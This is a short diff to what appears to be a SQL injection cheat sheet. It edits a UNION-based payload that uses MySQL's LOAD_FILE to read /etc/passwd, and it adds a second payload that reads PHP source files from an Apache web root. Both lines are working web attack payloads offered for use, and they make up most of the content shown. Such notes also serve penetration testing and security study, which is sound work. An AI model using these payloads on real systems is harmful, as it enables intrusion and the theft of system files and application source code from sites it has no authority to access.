@@ -7,11 +7,11 @@
 - Read system file 
 
 ```sql
-' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+-1' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
 ```
 - Read source code file in server => path apache web ( /var/www/html/...php )
 ```sql
-
+-1' UNION SELECT 1, LOAD_FILE("/var/www/html/...php"), 3, 4-- -
 ```
 
 ## Version
